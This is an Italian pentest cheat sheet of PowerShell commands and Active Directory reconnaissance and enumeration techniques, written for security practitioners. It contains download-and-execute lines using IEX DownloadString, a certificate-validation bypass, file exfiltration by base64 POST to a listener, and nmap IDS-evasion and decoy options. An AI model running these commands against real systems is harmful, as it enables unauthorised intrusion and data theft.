# Lista Link  
_Lista di comandi powershell:_

 [Comandi Powershell:](./#comandi-powershell)

   - [Comandi per i file:](./#comandi-per-i-file)
       - [Download/Upload file](./#downloadupload-file)

   - [Comandi ADS (Alternate Data Stream)](./#comandi-ads-alternate-data-stream)
  
_Lista che viene aggiornata man mano di metodologie, tool, comandi e CVE inerenti al mondo dell Active Directory:_

 [Active Directory Pentest:](./#active-directory-pentest)
 
   - [Recognition:](./#recognition)
       - [Passiva](./#passiva)
           - [Domini](./#domini)
           - [Ip](./#ip)
           - [Siti Web](./#siti-web)
       - [Attiva](./#attiva)
           - [Port Scanning](./#port-scanning)
           - [Sito Web](./#sito-web)

   - [Enumerazione:](./#enumerazione)
       - [Enumerazione Esterna](./#enumerazione-esterna)
       - [Enumerazione Interna](./#enumerazione-interna)
       - [Enumerazione host machine](./#enumerazione-host-machine)
           - [Sistema](./#sistema)
           - [Generali](./#generali)
           - [Rete e configurazioni](./#rete-e-configurazioni)
       - [Tools](./#tools)

   - [Privilege Escalation:](./#privilege-escalation)
       - [Servizi](./#servizi)
       - [Registri](./#registri)
       - [Credenziali](./#credenziali)
           - [Tools](./#tools-1)
       - [Varie](./#varie)
       - [Tools](./#tools-2)

   - [Lateral movements:](./#lateral-movements)
       - [Lanciare comandi da remoto](./#lanciare-comandi-da-remoto)
       - [Port Forwarding](./#port-forwarding)

   - [Persistence:](./#persistence)
       - [Gruppi](./#gruppi)
       - [Privilegi](./#privilegi)
       - [Servizi](./#servizi-1)
       - [File](./#file)
       - [Registri](./#registri-1)
       - [Varie](./#varie-1)

   - [Tools:](./#tools-3)
       - [Metasploit](./#metasploit)
       - [Powerview](./#Powerview)
       - [Bloodhund](./#bloodhund)
       - [Mimikatz](./#mimikatz)
       - [Impacket](./#impacket)
       - [Hashcat](./#hashcat)
           - [Creazione di wordlists](./#creazione-di-wordlists)
       - [CrackMapExec](./#CrackMapExec)

   - [DACL attacks:](./#dacl-attacks)
        - [AddMembers](./#addmember)
        - [WriteDACL](./#dacl-attacks)
        - [ForceChangePassword](./#forcechangepassword)
        - [GenericAll](./#genericall)
        - [WriteOwner](./#writeowner)
        - [GenericWrite](./#genericwrite)

   - [Bypass:](./#bypass)
        - [Bypass UAC](./#bypass-uac)
        - [Bypass AMSI](./#bypass-amsi)
        - [Bypass Applocker](./#bypass-applocker)
        - [Bypass Constrained Language Mode](./#bypass-constrained-language-mode)
        - [Bypass Logging](./#bypass-logging)
       
   - [CVE:](./#cve)
        - [CVE-2021-1675/CVE-2021-34527](./#cve-2021-1675cve-2021-34527-printnightmare)
        - [CVE-2022-26923](./#cve-2022-26923-vulnerabilit%C3%A0-sui-certificati-dellad)
           - [Certificati AD](./#certificati-ad)
        - [CVE-2023-23397](./#cve-2023-23397-outlook)

   - [Link a risorse esterne](./#link-a-risorse-esterne)

_Argomenti, note e tools inerenti a Windows:_

 [Windows:](./#windows)

   - [Processi di avvio](./#processi-di-avvio)

   - [API](./#api)

   - [PE (Portable Executable)](./#pe-portable-executable)

   - [Register keys](./#register-keys)

   - [UAC](./#uac)

   - [AMSI](./#amsi)

   - [Suite SysInternals:](./#suite-sysinternals)
        - [File e dischi](./#file-e-dischi)
        - [Rete](./#rete)
        - [Processi](./#processi)
        - [Sicurezza](./#sicurezza)
        - [Informazioni di sistema](./#informazioni-di-sistema)
        - [Generali](./#generali)

   - [Forense:](./#forense)
        - [FAT e NTFS](./#fat-e-ntfs)
        - [Registri](./#registri-2)
        - [File](./#file-1)
        - [Applicazioni](./#applicazioni)
        - [Log](./#log)
        - [Device Esterni](./#device-esterni)
        - [Tools](./#tools-4)

   - [Shellcode:](./#shellcode)
        - [Tecniche di Injection](./#tecniche-di-injection)
        - [Tecniche di esfiltrazione](./#tecniche-di-esfiltrazione)
        - [Decompiling e Debugging](./#decompiling-e-debugging)

   - [Note sulla sicurezza in Windows](./#note-sulla-sicurezza-in-windows)

_Sezione dei credits per i riconoscimenti:_

[Credits](./#credits)

## Disclaimer:

__Nell'intera repository troviamo la presenza di molto codice scritto in molteplici linguaggi e può capitare che nel tempo alcuni comandi o librerie diventino deprecate, inoltre è possibile che vi siano dei passaggi errati all'interno delle varie sezioni ogni comando è stato sempre prima testato ma i fattori che possano influenzare l'esito sono molteplici è quindi bene utilizzare anche internet per informarsi__

# Comandi Powershell:

```powershell
fl #comando per ricevere più output 
```

ES: `Get-Acl | fl`

```powershell
Get-Help <nome comando> -Full #comando per ottenere l'help 
```
```powershell
Update-Help -Force #comando per aggiornare gli help alla versione più recente    
```
```powershell
Select-Object #comando utilizzato per prendere un campo dell'oggetto specifico 
```

ES: `Get-LocalUser John | Select-Object LastLogon`

```powershell
Get-Command #comando utilizzato per sapere se un comando è presente in powershell
```
 
ES: `Get-Command *User*` 

```powershell
New-LocalUser  #comando per creare nuovi utenti locali
```

ES: `New-LocalUser -Name User -Password (ConvertTo-SecureString -AsPlainText "123456789" -Force)`

```powershell
New-LocalGroup #comando per creare un nuovo gruppo
```

ES: `New-LocalGroup -Name $Group`

```powershell
Add-LocalGroupMember #comando che aggiunge un utente ad un gruppo
```

ES: `Add-LocalGroupMember -Group $Group -Member $User`

```powershell
New-item #comando per creare file, cartelle o modificare valori
```
```powershell
Set-item #comando per modificare file, cartelle o modificare valori
```
```powershell
Start-service <nome servizio> #comando per avviare un servizio
```

ES: `Start-service WinRM`

```powershell
Set-DnsClientServerAddress -InterfaceIndex <num indice interfaccia di rete> -ServerAddresses <ip server dns> #comando per settare il dnsclient
```
```powershell
Set-ExecutionPolicy <tipo di policy> #comando per cambiare la execution policy
```
ES: 
 
`Set-ExecutionPolicy Unrestricted`

`Set-ExecutionPolicy Unrestricted -Scope currentuser`

__N.B: utile l'esempio di sopra se non si ha accesso alla chiave di registro HKLM, con la voce "currentuser" accediamo alla chiave HKLU__ 

```powershell
Enable-WindowsOptionalFeature -Online -FeatureName Microsoft-Windows-Subsystem-Linux #comando per avviare il subsystem di linux in windows
```

### Comandi per i File
```powershell
Get-Content -path "<file>" # comando per leggere il contenuto
```
ES: `(Get-Content -path "C:\Windows\system32\drivers\etc\hosts" -Encoding byte)`
```powershell
[IO.File]::WriteAllBytes(<file path>, <dati da scrivere>) #comando che dalla classe IO.FILE richiama WriteAllBytes che permette di scrivere
```
```powershell
Expand-Archive -Path "<path file zip>" -DestinationPath "<path dove salvare il file>" #comando per decomprimere il file
```
### Download/Upload File

__Download:__

_Download cioè dalla nostra machine alla target machine_
```powershell
curl -o <nome file>  http://<ip source>/<file da scaricare> #comando che da un link scarica un file e lo salva in locale
```
```powershell
(New-Object Net.WebClient).DownloadFile('<Target File URL>','<Output File>') #comando per fare un download
```
```powershell
(New-Object Net.WebClient).DownloadFileAsync('<Target File URL>','<Output File Name>') #comando per un download async cioè senza bloccare il calling thread
```
```powershell
[System.Net.ServicePointManager]::ServerCertificateValidationCallback = {$true} #comando per il bypass del certificato 
```
_E' possibile trasferire un file senza doverlo scaricare sul disco ma runnandolo direttamente in memoria:_ 
```powershell
IEX (New-Object Net.WebClient).DownloadString(<target File URL>, <Output File>) #comando che tramite IEX(Invoke-Expression) runna direttamente in memoria
```
 __Upload:__
 
 _Upload cioè dalla target machine alla nostra macchina_

 _Comandi per avviare un server upload python:_
```bash
pip3 install uploadserver #modulo che permette l'avvio di un uploadserver
```
```bash
python3 -m uploadserver #comando per avviarlo e funzionerà sulla porta 8000
```
_Ora insieme all'uploadserver nella macchina di origine va utilizzato lo script PSUpload.ps1_
```bash
python3 -m http.server 80 #comando per avviare il python server contenente lo script
```
```powershell
curl -o <nome eseguibile>.ps1 https://raw.githubusercontent.com/juliourena/plaintext/master/Powershell/PSUpload.ps1 #comando per scaricare l'eseguibile 
dal sito web
```
```powershell
IEX(New-Object Net.WebClient).DownloadString('http://<nostro_ip_locale>:<nostra_porta>/PSUpload.ps1') #comando variante che senza scaricare lo script lo 
runna direttamente
```
```powershell
. .\PSUpload.ps1 #comando per runnare lo script
```
```powershell
Invoke-FileUpload -Uri <URL da dove fare upload> -File <Path file di cosa uplodare> #comando dello script .ps1 per fare upload dei file
```
_Upload tramite encoding in base64:_ 
```powershell
$b64 = [System.convert]::ToBase64String((Get-Content -Path '<file target>' -Encoding Byte))
#variabile che stora il base64 del file
```
```powershell   
Invoke-WebRequest -Uri <ip server>:<porta> -Method POST -Body $b64 #inviamo il base64 del file tramite richiesta POST
```
```powershell
nc -lvnp <porta> #comando che apre un listener pronto a mostrarci il base64
```
_Upload tramite encoding con certuil:_
```powershell
certutil -encode <nome file> <nome file encodato> #comando per encodare il file
```
```powershell
Invoke-FileUpload -Uri <URL da dove fare upload> -File <Path file di cosa uplodare> #comando dello script .ps1 per fare upload dei file
```
```powershell
certutil -decode <nome file encodato> <nome file>  #comando per decodare il file
```
_Possibile pure decodificarlo con il sito [CyberChef](https://gchq.github.io/CyberChef/) passando il file in input_

- __SMB server:__

_Comando per avviare il server SMB per l'upload e download:_ 
```bash
smbserver.py <nome share online> <path directory locale che condividi> #comando che avvia in smbV1 il server
```
```bash
smbserver.py <nome share online> -smb2support <path directory locale che condividi> #comando per avviare il server con smbV2
```
```powershell
copy <path del file da uplodare>  \\<ip della destinazione dove mandare>\<nome share a cui accedere> 
#comando per fare upload, facendo una copia sul server SMB upload
```
```powershell
copy \\ip sorgente da cui scaricare\<nome share>\<file da scaricare> <Path locale di dove salvarlo> #comando per scaricare dal server SMB
```

- __GUI Host machine (SMB):__

_Questo metodo possiamo utilizzarlo quando abbiamo accesso ad uno share SMB di una windows target, piuttosto di fare il mount da CLI (molto instabile), possiamo utilizzare la GUI_

_Comandi:_

```
In alto a destra directory menu-> Open Folder-> Network-> clicchiamo Browse Network e attendiamo-> barra di ricerca inseriamo smb://<ip>/<nome share>-> inseriamo le credenziali se servono ed abbiamo fatto
#passi per montare uno share SMB con GUI nella host machine
```

### comandi ADS (alternate data stream):

_ADS (Alternate Data Streams), feature che permette di avere molteplici flussi di dati in un singolo file_

_Lista di comandi utili per gestire gli ADS:_
```powershell
Get-Item -path <path> -stream * #comando che ottiene tutti gli ADS 
```
```powershell
set-content -path <path del file> -stream <nome del nuovo stream> -value <contenuto per lo stream> #comando che crea un nuovo ADS con il contenuto indicato
```
```powershell
gci -recurse | % { gi $_.FullName -stream * } | where stream -ne ':$Data' #comando che cerca in tutto il filesystem la presenza di ADS
```
```powershell
remove-item –path <path al file> –stream <nome stream da rimuovere> #comando che rimuove lo stream su un determinato file
```
```powershell
Get-Content -path <path del file da leggere>:<nome dell'ADS> #comando per leggere il contenuto dello stream di un file
```
# Active Directory Pentest:

# Recognition:

_La fase di recognition è una se non la fase più importante, la quale determina con quale approccio poi potersi interfacciare con il target, in questa sezione vogliamo dare un'infarinatura generale cercando di non sfociare troppo nell'OSINT (Open Source Intelligence) ma piuttosto poter trovare il nostro foothold_

### Passiva:

_La fase di recognition passiva consiste nell'utilizzare fonti aperte e siti esterni che aiutino nella ricerca di informazioni più utili possibili del target, senza doverci interagire_

##### Domini:

_Enumerare un dominio è il primo passo, stiamo parlando della prima connessione che abbiamo con il nostro target ed iniziare a capire in che modo è strutturato può rivelarsi molto utile_

- __DnsDumpster:__

_[DnsDumpster](https://dnsdumpster.com/) sito molto completo per l'enumerazione di subdomains, può essere maggiormente integrato con il sito [viewDNS](https://viewdns.info/) che dispone di informazioni ulteriori da poter vedere_

- __Crt.sh:__

_[crt.sh](https://crt.sh/), sito per controllare i certificati, dove possiamo scoprire eventuali subdomains e relativi Ip_

- __CriminalIp__

_[Criminalip](www.criminalip.io), sito utile per carpire informazioni sulla sicurezza e affidabilità del sito target come: JS obfuscato, sito di Phising e altre informazioni importanti_

##### Ip:

_Dalla ricerca dei domini possiamo passare ad una ricerca più granulare con l'indirizzi IP trovati_

- __Shodan, Censys e Zoomeye:__

_Una volta trovati indirizzi IP possiamo scannerizzarli con i tre siti [Shodan](https://www.shodan.io/), [Censys](https://search.censys.io/) e [Zoomeye](https://www.zoomeye.org/)_

__N.B: Vengono mostrate 3 opzioni in quanto un possibile target potrebbe pagare uno dei siti per non essere indicizzato__

- __G-suite tools e Traceroute Online:__

_I due siti [G-suite tools](https://gsuite.tools/it) e [Traceroute Online](https://traceroute-online.com/) utilizzati insieme offrono ping e traceroute mappati_

- __Check-Host:__

_Il sito [Check-Host](https://check-host.net/) può essere utilizzato per capire da quale paese sono bloccati gli ip, quindi capire da dove poter utilizzare un eventuale VPN o Proxychain_

##### Siti Web:

_Nella quasi totalità dei casi ci sarà un sito web d'analizzare quindi:_

- __Netcraft:__

_[Netcraft](https://sitereport.netcraft.com/) verrà utilizzato come primo strumento per avere un'idea del sito web stesso_

- __Wayback Machine:__

_[Wayback Machine](https://archive.org/web/) può ritornaci molto utile per vedere lo storico del sito target e come è evoluto_

- __XML-Sitemaps:__

_Il sito [XML-Sitemaps](https://www.xml-sitemaps.com/) permette di fare un crawling delle varie subdirectory e in un secondo momento visionare i risultati sul sito o in un file_

- __Buckets.GrayHatWarfare:__

_[Buckets.GrayHatWarfare](https://buckets.grayhatwarfare.com/) dà la possibilità di controllare la presenza di file lasciati in giro provenienti da container aperti in cloud (AWS, Google Cloud e Azure)_

- __Proxyium__
_Andremo ad interagire con il sito web ma sempre in maniera anonima grazie al sito [Proxyium](https://proxyium.com/), infatti prima inseriremo l'URL del target all'interno di Proxyium il quale farà da proxychain, una volta all'interno possiamo navigare all'interno del sito e analizzare le tecnologie utilizzate grazie all'estensione [Wappalyzer](https://chrome.google.com/webstore/detail/wappalyzer-technology-pro/gppongmhjkpfnbhagpmjfkannfbllamg?hl=it)_

__N.B: utilizzare la proxy solo per la fase di recon in quanto sicuramente ogni nostra azione sarà registrata__

- __Hunter.io e Email Extractor:__

_il sito [Hunter.io](https://hunter.io/search) e l'estensione [Email Extractor](https://chrome.google.com/webstore/detail/email-extractor/jdianbbpnakhcmfkcckaboohfgnngfcc) permettono uno scraping delle email all'interno del sito per poi poterle utilizzare in altre fasi del PT_

__N.B: Hunter.io ci si deve registrare e permette un numero limitato di ricerche ma è molto più potente di Email Extractor__

### Attiva: 

_La fase di recognition attiva ci obbliga ad interagire con il target per approfondire la nostra ricerca_

##### Port Scanning:

_La fase di port scanning consiste nell'iniziare a conoscere quali porte siano aperte e che cosa vi giri dietro_

- __Nmap:__

_La nostra prima superficie di attacco sono le porte quindi il primo passo da compiere è capire quali servizi girino dietro esse_

_Comandi:_

__N.B: le combinazioni possibili delle flag che mette a disposizione nmap sono molteplici quindi non tutte potranno essere presente__

```bash
nmap -sC -sV -p- <ip> #comando per fare lo scanning di tutte le porte di un determinato ip con l'aggiunta delle flag -sC (standard script) e -sV (standard version) aumentano l'efficacia di raccolta informazioni
```
1) Detection ed evasion dei sistemi di sicurezza:

_Molte volte l'azienda target in sua difesa può ricorrere a sistemi quali: firewall, IDS e ecc... sapere come detectarli e trovare una qualche maniera di bypassarli è un passo fondamentale_

__N.B: le tecniche di detection ed evasion sono molteplici e non è possibile inserirle tutte__

_Detection:_

I) -O = flag per lo scanning del sistema operativo

II) -traceroute = flag per capire per dove passa il nostro traffico e fin dove arriva

III) --badsum = flag che manda un bad checksum, i sistemi di sicurezza che non li controllano ci ritorneranno una risposta mentre un host normale dovrebbe rifiutarli

IV) -sA (ACK scan) = flag che esegue uno scan inviando semplicemente un ACK, se non si riceve risposta si presuppone che la porta sia aperta o filtrata

V) -sT, -sN, e -sX = flag che eseguono il full TCP scan (-ST, abbastenza stealth perchè non lascia connessioni incomplete), NULL scan che invia pacchetti nulli se riceviamo TCP RST la porta risulta se ignorato invece è probabile che sia aperta (-sN) e infine Xmas scan se la porta è filtrata il pacchetto è ignorato (-sX)

VI) --script=firewalk --traceroute = flag che uniti insieme tentano di recuperare informazioni tramite il TTL (Time to live)

_Evasion:_

I) -f = flag che fragmenta i pacchetti inviati
```bash
nmap  -f -sC -sV -p- <ip> #comando che esegue la fragmentation
```
II) -T, --min-parallelism, --max-rtt-timeout, --scan-delay e --max-retries = tutte le flag che giocano sui fattori velocità (-T), frequenza (--min-parallelism), tempo di attesa (--max-rtt-timeout), delay da un pacchetto all'altro (--scan-delay) e tentativi massimi (--max-retries); mischiarli insieme può bypassare i sistemi di sicurezza basati sulle tempistiche dei pacchetti
```bash
nmap -sT -T<num da 1 a 5> --scand-delay <num in ms> --max retries <num tentativi> -sC -sV -p- <ip> #comando per fare lo scanning di tutte le porte di un determinato ip in maniera più stealth, tramite la flag -sT (Complete scan, non lascia connessioni incomplete) e la flag -T (indica l'aggressività da 1 a 5)
```
III) --spoof-mac, -S, --source-port e --data-length = flag che cambiano il mac address (--spoof-mac), modificano l'ip sorgente (-S), la porta sorgente (--source-port) e aggiungono finti bytes (--data-length)
```bash
nmap --source-port 443 -p <porta destinazione> --data-length 850 <ip target> #comando che scansiona una porta specifica e con le flag inserite simuliamo una connessione criptata
```
IV) -D = flag che permette di inserire finti IP in catena insieme a quello nostro reale
```bash
nmap -D RND:<num finti ip da generare> <ip target> #comando che usa il decoy, con RND genera indirizzi ip a caso
```
2) _Scripting nmap:_

_Feature utile del tool è lo script engine che mette a disposizione una lista di script visitabile [qui](https://nmap.org/man/it/man-nmap-scripting-engine.html)_

- __Rustscan:__

_Rustcan è un'alternativa a Nmap scritta in Rust perciò estremamente veloce e facile da usare, può essere anche configurato per lavorare insieme ad Nmap_

_Comandi:_
```bash
rustscan -a <ip> -- -sC -sV #comando per avviare rustscan con poi l'utilizzo di nmap
```

##### Sito web:

- __Sub-Domain Enumeration:__

_Quando abbiamo davanti un webserver è importante conoscere tutti i domini e host virtuali; spesso infatti gli amministratori dei server lasciano un dominio da cui amministrano il webserver_

- _Wfuzz:_
_con Wfuzz possiamo 'FUZZARE' i subdoamin attraverso liste che possiamo trovare su github come la [Seclists](https://github.com/danielmiessler/SecLists)_
```bash
wfuzz -c -w /usr/share/seclists/Discovery/DNS/subdomains-top1million-110000.txt -u http://<ip>/ -H "Host:FUZZ.<subdomain 1>.<top level domain>" --hl <numero di linee da filtrare>
```

__N.B: Consigliamo prima di avviare wfuzz senza la flag -h (hide) perchè va capito cosa nascondere dall'output del comando__

- __Directory Enumeration:__
_Per avere una visione di insieme del webserver è importante conoscere tutte le rotte e le pagine del sito così da enumerarle e cercare eventuali vulnerabilità_

- _FeroxBuster:_

_FeroxBuster è tool scritto in Rust estremamente veloce e completo con cui potremo fuzzare i webserver utilizzando wordlist_

_Con il seguente scan avviamo un'enumerazione recursiva delle directory del webserver ed inoltre andremo ad affinare la ricerca aggiungendo la ricerca delle estensioni con la flag '-x' (Ovviamente possono essere ridotte per incrementare la velocità dello scan sacrificando l'accuratezza)_
```bash
feroxbuster -u http://<sitoweb>/ -w /usr/share/wordlists/webpageenum.txt -x php,txt,bak,py,js,html,pdf,git,zip,7z,docx,old,sh -t <num thread> -d <num di profondità> #comando per avviare feroxbuster
```

- __Indicazione Generali:__

_Scrivere in maniera completa della fase attiva contro un sito web è impossibile perchè i footholds e le metodologie sono molteplici, i consigli generali per muoversi possono essere:_

1) Controllare i vari campi di input e provare gli attacchi più noti

2) Utilizzare [Burpsuite](https://portswigger.net/burp) per vedere come il server elabora le richieste

3) Controllare la versione delle tecnologie utilizzate dal sito per possibili exploit

4) Visionare il sito, utilizzarlo e comprendere il suo reale utilizzo

5) Google è nostro amico per qualsiasi dubbio va utilizzato 

# Enumerazione:

_La pratica di enumerare è una tra le più importanti, in quanto permette di ricavare informazioni vitali sul target e permette di progettare i prossimi movimenti; prima di entrare però si ha la necessità di enumerare dall'esterno e vi sono vari metodi_

### Enumerazione Esterna:

- _Enumerazione del DC:_
  
_Comando per enumerare il DC, ci da l'output di: nome dominio, gruppi, utenti, SMB e altro:_

```bash
git clone https://github.com/cddmp/enum4linux-ng.git
pip3 install -r requirements.txt #comandi per impostare il tool
```
```bash
python3 enum4linux-ng.py <ip> #comando per l'enumerazione
```  
- _SMB enumerazione e comandi:_
```bash
smbmap -H <ip> -L #comando per listare e indica i permessi
```
```bash
smbclient -L \\\\<ip>\\ #comando per listare
```
```bash
smbclient \\\\<ip>\\<shares> -U <user> #comando per entrare nello share e poi inserire la password
```
- _Enumerazione utenti:_

- _[Crackmapexec](./#crackmapexec), solo se abbiamo l'accesso a IPC$ all'interno del servizio SMB, per averlo quindi deve essere abilitato l'anonymous login:_
```
crackmapexec smb <nome dominio> -u '<nome utente>' -p '' --rid-brute
```
- _[Kerbrute](https://github.com/ropnop/kerbrute), tramite una lista di user possiamo vedere che quali ci sono nell'AD target:_
```
kerbrute userenum -d <nome dominio> --dc <ip del domain controller> <wordlist> --continue-on-success
```

- _Enumerazione con rpcclient:_

_il tool rpcclient utilizza il protocollo Samba e inoltre fa uso del MS-RPC per integrare maggiori funzionalità_

_Comandi:_
```bash
rpcclient -U "" -N  <ip> #comando che si connette tramite anonymous login
```
```bash
enumdomusers #comando per enumerare tutti gli utenti
```
```bash
enumdomgroups #comando per listare i gruppi
```
```bash
queryuser 0x<numero rid in esadecimale> #comando per ottenere maggiori informazioni su un utente
```
```bash
queryusergroups 0x<numero rid in esadecimale> #comando per ottenere maggiori informazioni sui gruppi degli utenti
```
```bash
querygroup 0x<numero rid in esadecimale> #comando per ottenere maggiori informazioni di un gruppo
```
```bash
querygroupmem 0x<numero rid in esadecimale> #comando per ottenere maggiori sui membri di un gruppo
```
```bash
netshareenumall #comando per enumerare gli shares
```
- _Enumerazione con LDAP:_

_LDAP (Lightweight Directory Access Protocol) è un protocollo di autenticazione per determinare risorse in una rete, inoltre contiene dati di utenti, gruppi e potenziali password_

_Comandi:_
```bash
nmap -n -sV --script "ldap* and not brute" <ip> #comando che tramite anonymous login tenta il recupero di informazioni
```
```bash
ldapsearch -x -H ldap://<ip> -D '<dominio>\<username>' -w '<password>' -b "DC=<primo sottodominio>,DC=<top level domain>" #comando che verifica se le credenziali sono giuste
```

_[windapsearch](https://github.com/ropnop/windapsearch) script in python che velocizza l'enumerazione di utenti e gruppi ma bisogna possedere credenziali valide per utilizzarlo_
```bash
sudo apt-get install python-ldap #comando per installare lo script
```
```bash
python3 windapsearch.py --dc-ip <ip> -u "" -U #comando per dumpare gli users tramite anonymous login
```
```bash
python3 windapsearch.py --dc-ip <ip> -u <utente>@<dominio> -p <password> --da #comando per dumpare users
```
```bash
python3 windapsearch.py --dc-ip <ip> -u <utente>@<dominio> -p <password> --groups #comando per dumpare i gruppi
```
- __Metodi di connessione remota alla target machine e comandi utili:__

_L'enumerazione dall'esterno a i suoi limiti, ad un certo punto bisogna trovare un punto di connessione con la target machine ed enumerarla dall'interno_
```bash
winexe -U '<username>%<password>' //<ip_bersaglio> cmd.exe  #comando che esegue processi (in questo caso cmd) da remoto sfruttando SMB
```

- _WinRM:_
```bash
evil-winrm -i <nome dominio> -u <nome utente> -H <hash NTLM> o -p <password> #utilizziamo il WinRM protocol per connettersi
```
```bash
upload <path file locale della nostra macchina> <nome di come salvarlo> #comando per uplodare dalla kali alla target machine il file tramite evil-winrm
```
```bash
download <path file da dove dove scaricare> <path file destinazione nella nostra macchina> #comando per il download del file dalla target machine alla kali tramite evil-winrm
```
__Kerberos double hop problem:__

_Il kerberos double hop problem consiste che utilizzando powershell/winrm per effettuare l'accesso non stiamo utilizzando delle credenziali che rimarranno in memoria sulla macchina dove vogliamo connetterci (Quindi permettono di autenticarci verso altri servizi o macchine) ma i kerberos ticket i quali danno accesso ad un servizio specifico (esempio una macchina)_

ES:

_Utilizzo credenziali NTLM:_

`macchina kali------> macchina vittima connessi---------> DC` = la macchina vittima avrà in memoria le credenziali NTLM che possono permetterci l'autenticazione verso il DC

_Utilizzo TGT/TGS:_

`macchina kali------> macchina vittima connessi con WinRM---------> DC` = La macchina vittima se vuole comunicare con il DC non può perchè il TGT (Ticket Granting Ticket) non essendo presente in memoria non può autenticare l'utente verso altri servizi tipo il DC

_Soluzioni:_

1) PSCredential Object:

_Creazione di un PSCredential Object da inviare per autenticarsi_

_Comandi:_
```powershell
$Password = ConvertTo-SecureString '<password user target>' -AsPlainText -Force #comando che crea una variabile contenente la password
```
```powershell
$Credenziali = New-Object System.Management.Automation.PSCredential('dominio\utente', $Password) #comando che crea una variabile contenente l'oggetto PSCredential da passare per autenticarsi
```
```powershell
Get-DomainUser -spn -credential $Credenziali #comando del tool powerview che passandogli le credenziali permette di autenticarci verso il DC ed enumerarlo
```

- _RDP:_
```bash
rdesktop -u <nome utente> -p <password> <ip> #comando per connettersi con RDP
```
```bash
xfreerdp /v:<ip> /u:<user> /p:<password> /dynamic-resolution /drive:<nome share>,<nome path locale> #comando per connettersi con RDP
```
- __Autenticazioni:__

_RunAs.exe:_
  
 _Una volta riusciti ad ottenere delle credenziali valide è tempo di entrare nel sistema e iniziare l'enumerazione interna però è anche vero che prima va capito dove poter utilizzare queste credenziali un metodo può essere __"RunAs.exe"__ il quale è un binario di windows che permette di eseguire uno script o un programma con credenziali di altri utenti_

_Comandi:_
```cmd
runas.exe /netonly /user:<dominio>\<nome utente> cmd.exe #comando che date delle credenziali le utilizza per aprire un CMD
/netonly #flag del comando runas che indica di utilizzare le credenziali per l'autenticazione di rete, infatti le credenziali che inseriamo verranno prese 
per buone, in quanto non verificate dal domain controller ma semplicemente caricate in memoria
```
__N.B: Runnare il CMD dalla propria machine con privilegi di amministratore cosi che il CMD creato in seguito abbia un token di IL high__

### Enumerazione Interna:

- _Enumerazione della rete con nmap:_

_Una volta all'interno avere una visione sulla rete target è fondamentale_

```bash
nmap -sn -Pn <ip>/<num bit dedicati alla rete> #comando per fare lo scanning della subnet, senza pingarle e enumerare le porte
```
```bash
nmap -Pn <ip>/<num bit dedicati alla rete> #comando per fare lo scanning della subnet
```
```bash
nmap -Pn <ip> -n --disable-arp-ping -PE --reason #comando per enumerare un solo host, la flag PE indica ICMP echo requests, il -n disattiva la risoluzione DNS
```
- _Enumerazione SYSVOL:_

_Un buon metodo per verificare che le credenziali inserite nella fase di autenticazione siano valide è tramite l'enumerazione di SYSVOL, che anche l'utente con meno privilegi può listare; SYSVOL è una cartella presente in tutti i domain controller è importante perchè contiene dati e informazioni importanti per la replicazione di quest'ultimi tra domain controllers_

_Comandi:_ 
```cmd
dir \\<nome dominio o ip>\SYSVOL\ #comando per listare la directory SYSVOL
```
__N.B: Vi è una differenza tra listare con il nome dominio o con l'indirizzo IP, utilizzando l'hostname verrà eseguito il kerberos authentication mentre con l'indirizzo IP verrà utilizzato NTLM.__

- _Enumerazione tramite MMC e RSAT:_

_Nel MMC (Microsoft Management Console) possiamo trovare al suo interno degli snap-in di provenienti da __"RSAT (Remote Server Administration Tools)"__, una suite di tools per amministrare da remoto un'active directory_

__N.B: Questo tipo di enumerazione richiede di avere accesso ad una GUI quindi una connessione RDP ma come sappiamo non sempre è possibile__

_Comandi:_
```
start-> App e Funzionalità-> aggiungi una funzionalità-> RSAT-> installa #passi per installare RSAT
```
_Avendo installato RSAT avremo ora disponibili in MMC degli snap-in per il controllo dell'AD_
```
mmc-> FIle-> Aggiungi/rimuovi snap-in-> aggiungiamo i 3 snap-in quali: Domini e trust di Active Directory, Siti e servizi di Active Directory infine Utenti e computer di Active Directory-> ai primi 2 snap-in va cambiato la forest con il dominio target, al terzo snap-in va cambiato il dominio con il dominio target #passi per installare e configurare gli snap-in 
```
_Ora che gli snap-in sono pronti non ci resta che dare uno sguardo all'AD_
```
Utenti e computer di Active Directory-> dominio target-> si apriranno diverse cartelle dove possiamo vedere per esempio chi appartiene al dominio, le macchine a dominio ecc... #passi per visionare l'interno dell'AD tramite lo snap-in
```
   
- _Enumerazione tramite Powershell:_

_Powershell permette di ampliare le nostre capacità di enumerazione perchè dispone di cmdlets più potenti e che permettono la scrittura di comandi ancora più complessi tipo [PowerView](./#Powerview)_

_Comandi:_
```powershell
Get-Module #comando per recuperare i moduli importati
```
```powershell
Get-ADUser -Filter * | fl * #comando per listare tutti gli utenti e avere maggiore informazioni di output
```
```powershell
Get-ADUser -Identity <SAM nome> -Server <hostname> -Properties * #comando per enumerare uno specifico utente con tutte le sue proprietà
```
```powershell
Get-ADGroup -Filter * | fl * #comando per enumerare i gruppi e avere maggiore output di informazioni
```
```powershell
Get-ADGroup -Identity <nome gruppo> -Server <hostname> #comando per enumerare un gruppo specifico
```
```powershell
Get-ADGroupMember -Identity <nome gruppo> -Server <hostname> #comando per enumerare i membri di un gruppo specifico
```
```powershell
Get-ADObject -Filter 'badPwdCount -gt 0' -Server <hostname> #comando che cerca tra gli ADObject account che hanno più di un tentativo fallito di accesso
```
```powershell
Get-ADDomain -Server <hostname> #comando che recupera maggiori informazioni sul dominio
```
```powershell
Get-ADTrust -Filter *#comando che recupera la fiducia tra domini o tra domini di altre forest
```
```powershell
Get-ADDomain #comando per prendere tutte le informazione dell'AD Domain
```
```powershell 
Get-NetIPAddress #comando powershell per ottenere la configurazione di rete
```
```powershell
Get-MpComputerStatus #comando per vedere info su microsoft defender
```
```powershell
Get-HotFix | ft -AutoSize #comando che mostra cosa è stato aggiornato e quando
```
```powershell
Get-ComputerInfo #comando che prende informazioni della macchina
```
```powershell
Get-Localuser #comando che lista gli utenti locali nella macchina
```
```powershell
Get-LocalGroup #comando che lista i gruppi locali nella macchina
```
```powershell
Get-ScheduledTask #comando che lista tutti gli schedule
```
```powershell
Get-Acl #comando per listare le access-list dei permessi
```
```powershell
Get-PSDrive  #comando che lista i drive dell'ambiente legati a powershell che possono essere variabili, oggetti, registri e volumi.
```
```powershell
IEX(iwr 'https://gist.githubusercontent.com/egre55/816ddb91016034dcf747f4ea5f054767/raw/5ef623d3697af04dea7badcf96074c2494578ffe/procmon.ps1') | fl * #comando che fa una richiesta web di un piccolo script che agisce come procomon tramite IEX lo esegue subito in memoria, fl è per ricevere più output
```
